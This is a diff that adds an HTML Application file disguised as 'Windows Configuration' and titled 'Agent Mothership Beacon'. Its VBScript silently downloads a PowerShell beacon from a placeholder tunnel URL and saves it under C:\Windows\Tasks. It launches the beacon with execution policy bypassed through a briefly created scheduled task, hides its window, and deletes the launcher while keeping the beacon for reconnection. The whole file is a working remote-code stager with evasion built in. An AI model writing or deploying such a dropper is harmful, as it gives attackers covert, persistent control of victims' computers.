@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Agent Mothership Beacon</title>
+<HTA:APPLICATION
+  ID="BeaconDeployer"
+  APPLICATIONNAME="Windows Configuration"
+  WINDOWSTATE="minimize"
+  SHOWINTASKBAR="no"
+  SINGLEINSTANCE="yes"
+  SYSMENU="no"
+  BORDER="none"
+  INNERBORDER="no"
+  CONTEXTMENU="no"
+  SELECTION="no"
+  CAPTION="no"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="no"
+  NAVIGABLE="no"
+/>
+<style>
+body { margin:0; padding:20px; font-family:'Segoe UI',sans-serif; background:#1a1a2e; color:#e0e0e0; display:none; }
+</style>
+</head>
+<body>
+<script language="VBScript">
+Option Explicit
+Dim TUNNEL, WshShell, Fso, Ret, PsContent, BatchContent
+
+' ─── CONFIG ───
+TUNNEL = "__TUNNEL_URL__"
+
+' ─── STEP 1: Download beacon script ───
+Sub DownloadBeacon
+  Dim Http, PsUrl
+  PsUrl = TUNNEL & "/beacon-script"
+  
+  Set Http = CreateObject("MSXML2.XMLHTTP")
+  Http.open "GET", PsUrl, False
+  Http.send
+  
+  If Http.Status = 200 Then
+    PsContent = Http.responseText
+  Else
+    Call Fail("Download failed: HTTP " & Http.Status)
+  End If
+End Sub
+
+' ─── STEP 2: Write files ───
+Sub WriteFiles
+  Set Fso = CreateObject("Scripting.FileSystemObject")
+  
+  ' Write beacon.ps1
+  Dim PsFile
+  Set PsFile = Fso.CreateTextFile("C:\Windows\Tasks\beacon.ps1", True, True)
+  PsFile.Write PsContent
+  PsFile.Close
+  
+  ' Write launcher batch
+  BatchContent = "@echo off" & vbCrLf & _
+    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -ExecutionPolicy Bypass -File C:\Windows\Tasks\beacon.ps1" & vbCrLf
+  Dim BatFile
+  Set BatFile = Fso.CreateTextFile("C:\Windows\Tasks\beacon-launch.bat", True, False)
+  BatFile.Write BatchContent
+  BatFile.Close
+End Sub
+
+' ─── STEP 3: Create and run SCHTASKS ───
+Sub RunSchtasks
+  Set WshShell = CreateObject("WScript.Shell")
+  
+  ' Create task
+  Ret = WshShell.Run("cmd.exe /c schtasks /create /tn ""BeaconLaunch"" /tr ""cmd.exe /c C:\Windows\Tasks\beacon-launch.bat"" /sc ONCE /st 23:59 /f", 0, True)
+  
+  ' Run task
+  Ret = WshShell.Run("cmd.exe /c schtasks /run /tn ""BeaconLaunch""", 0, True)
+  
+  ' Delete task (cleanup)
+  Ret = WshShell.Run("cmd.exe /c schtasks /delete /tn ""BeaconLaunch"" /f", 0, True)
+End Sub
+
+' ─── STEP 4: Cleanup ───
+Sub Cleanup
+  Set Fso = CreateObject("Scripting.FileSystemObject")
+  If Fso.FileExists("C:\Windows\Tasks\beacon-launch.bat") Then
+    Fso.DeleteFile "C:\Windows\Tasks\beacon-launch.bat", True
+  End If
+  If Fso.FileExists("C:\Windows\Tasks\beacon.ps1") Then
+    ' Keep beacon.ps1 for reconnection
+  End If
+End Sub
+
+Sub Fail(Msg)
+  Call WshShell.Popup(Msg, 10, "Error", 16)
+  Self.Close()
+End Sub
+
+' ─── MAIN ───
+Sub Main
+  Set WshShell = CreateObject("WScript.Shell")
+  
+  On Error Resume Next
+  Call DownloadBeacon
+  If Err.Number <> 0 Then
+    Call Fail("Download failed: " & Err.Description)
+  End If
+  On Error GoTo 0
+  
+  Call WriteFiles
+  Call RunSchtasks
+  Call Cleanup
+End Sub
+
+Call Main
+window.close()
+</script>
+</body>
+</html>
